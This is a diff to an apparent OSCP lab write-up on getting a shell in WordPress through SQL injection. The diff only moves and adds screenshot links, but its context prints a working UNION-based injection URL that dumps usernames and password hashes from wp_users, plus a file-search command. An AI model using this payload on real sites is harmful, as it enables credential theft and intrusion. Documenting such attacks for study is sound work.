@@ -1,4 +1,3 @@
-![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/d741d6f2-efee-4a56-aeaf-2e3d8ca8b7ee)
 
 # Uploading a Shell in WordPress via SQLi Entry Point 
 
@@ -20,6 +19,7 @@ The payload used for exploiting this vulnerability is:
 ```
 https://example.com/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
 ```
+![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/d741d6f2-efee-4a56-aeaf-2e3d8ca8b7ee)
 
 The `question_id` must start with an existing post ID. Upon executing this payload, user credentials were leaked, including hashed passwords.
 
@@ -77,6 +77,7 @@ Use the following command to find all `.txt` files in the `/var/www` directory:
 ```sh
 find /var/www -type f -name "*.txt"
 ```
+![image](https://github.com/MalekAlthubiany/WordPressShell-OSCP/assets/127455300/4a7875cd-071b-4ce0-a6c3-097c0fd20e09)
 
 The results from this command include:
 
